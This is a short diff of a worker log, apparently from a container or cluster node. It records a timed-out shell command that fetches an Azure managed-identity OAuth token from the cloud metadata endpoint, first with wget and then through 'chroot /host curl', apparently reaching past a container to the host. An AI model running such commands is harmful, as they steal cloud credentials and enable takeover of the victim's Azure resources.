@@ -1,2 +1,1 @@
-[hn-worker-5]
-sh: curl: not found
+[hn-worker-5] ERR:Command '['sh', '-c', 'wget -q -O - --header="Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | head -5; echo "---"; chroot /host curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | head -5 # SEA2-MSI2']' timed out after 240 seconds
